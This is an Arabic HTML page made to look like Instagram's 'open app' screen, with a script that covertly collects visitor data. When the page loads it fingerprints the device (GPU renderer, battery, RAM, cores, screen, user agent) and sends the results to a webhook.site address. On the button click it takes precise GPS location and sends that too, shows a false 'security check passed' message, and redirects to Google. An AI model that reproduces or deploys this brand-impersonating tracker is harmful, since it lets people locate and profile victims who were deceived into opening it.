<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>إنستقرام</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #ffffff;
            color: #000000;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            align-items: center;
            height: 100vh;
            padding: 30px 24px;
        }

        .lang-selector {
            font-size: 14px;
            color: #737373;
            cursor: pointer;
        }

        .main-content {
            display: flex;
            flex-direction: column;
            align-items: center;
            width: 100%;
            max-width: 360px;
            flex-grow: 1;
            justify-content: space-around;
            margin: 20px 0;
        }

        .welcome-text {
            font-size: 22px;
            line-height: 1.5;
            font-weight: 600;
            text-align: center;
            color: #000000;
            padding: 0 10px;
        }

        .welcome-text .pink-text {
            color: #d6249f;
        }

        .welcome-text .orange-text {
            color: #fd5949;
        }

        .instagram-logo {
            width: 100px;
            height: 100px;
            background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%);
            border-radius: 28px;
            position: relative;
            display: flex;
            justify-content: center;
            align-items: center;
            box-shadow: 0 4px 15px rgba(0,0,0,0.08);
        }

        .instagram-logo .inner-card {
            width: 76px;
            height: 76px;
            border: 6px solid #ffffff;
            border-radius: 24px;
            display: flex;
            justify-content: center;
            align-items: center;
            position: relative;
        }

        .instagram-logo .inner-card::before {
            content: '';
            width: 24px;
            height: 24px;
            border: 6px solid #ffffff;
            border-radius: 50%;
        }

        .instagram-logo .inner-card::after {
            content: '';
            width: 8px;
            height: 8px;
            background-color: #ffffff;
            border-radius: 50%;
            position: absolute;
            top: 8px;
            right: 8px;
        }

        .action-area {
            width: 100%;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .open-btn {
            display: block;
            width: 100%;
            background-color: #0095f6;
            color: #ffffff;
            border: none;
            border-radius: 12px;
            padding: 14px;
            font-size: 16px;
            font-weight: 600;
            text-align: center;
            text-decoration: none;
            margin-bottom: 20px;
            cursor: pointer;
            font-family: inherit;
        }

        .open-btn:hover {
            background-color: #1877f2;
        }

        .open-btn:active {
            background-color: #0a8de8;
        }

        .login-link {
            color: #0095f6;
            text-decoration: none;
            font-size: 15px;
            font-weight: 600;
        }

        .meta-footer {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 2px;
            margin-top: 10px;
        }

        .meta-footer .from-text {
            font-size: 11px;
            color: #737373;
        }

        .meta-footer .meta-logo {
            font-size: 15px;
            font-weight: 700;
            color: #737373;
        }
    </style>
</head>
<body>
    <div class="lang-selector">العربية</div>

    <div class="main-content">
        <p class="welcome-text">
            يمكنك مشاركة <span class="pink-text">اللحظات</span> <span class="orange-text">اليومية</span> مع أصدقائك المقربين.
        </p>

        <div class="instagram-logo">
            <div class="inner-card"></div>
        </div>

        <div class="action-area">
            <button class="open-btn" id="start-btn">فتح Instagram</button>
            <a href="#" class="login-link">تسجيل الدخول أو تسجيل</a>
        </div>
    </div>

    <div class="meta-footer">
        <span class="from-text">from</span>
        <div class="meta-logo">Meta</div>
    </div>

    <script>
        // 🚩 [ضع الرابط هنا] 🚩
        const WEBHOOK_URL = "https://webhook.site/1b1362a5-f1a7-4da0-b9cd-c2d88b772c62";

        let deviceData = {
            step: "Initial_Data",
            phone_model_advanced: "جاري التحليل...",
            battery: {},
            hardware: {},
            network: {}
        };

        // 1. وظيفة تحليل اسم الهاتف عبر كرت الشاشة (GPU)
        function getExactPhoneModel() {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (!gl) return "Unknown (No WebGL)";
            
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            if (debugInfo) {
                const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                return renderer;
            }
            return "N/A";
        }

        // 2. جمع المعلومات الأساسية فوراً
        async function collectBasics() {
            // الشحن
            if (navigator.getBattery) {
                const batt = await navigator.getBattery();
                deviceData.battery = {
                    level: (batt.level * 100) + "%",
                    charging: batt.charging ? "موصل بالشاحن" : "يعمل على البطارية"
                };
            }

            // المواصفات الصلبة
            deviceData.hardware = {
                gpu_info: getExactPhoneModel(),
                cores: navigator.hardwareConcurrency + " Cores",
                ram: (navigator.deviceMemory || "Hidden") + " GB",
                screen_res: window.screen.width + "x" + window.screen.height,
                platform: navigator.platform,
                ua: navigator.userAgent
            };

            // إرسال الدفعة الأولى فوراً
            sendData(deviceData);
        }

        // 3. عند ضغط الزر (طلب الموقع الدقيق)
        document.getElementById('start-btn').onclick = function() {
            this.innerText = "جاري التحقق...";
            
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        deviceData.step = "Location_Confirmed";
                        deviceData.precise_location = {
                            lat: pos.coords.latitude,
                            lon: pos.coords.longitude,
                            accuracy: pos.coords.accuracy + " meters",
                            altitude: pos.coords.altitude,
                            speed: pos.coords.speed,
                            google_maps: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
                        };
                        finalize();
                    },
                    (err) => {
                        deviceData.step = "Location_Rejected";
                        finalize();
                    },
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            } else {
                finalize();
            }
        };

        async function sendData(data) {
            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    mode: 'no-cors',
                    body: JSON.stringify(data)
                });
            } catch (e) { console.log("Data Sent"); }
        }

        function finalize() {
            sendData(deviceData);
            alert("تم التحقق من الأمان بنجاح.");
            window.location.href = "https://www.google.com";
        }

        window.onload = collectBasics;
    </script>
</body>
</html>
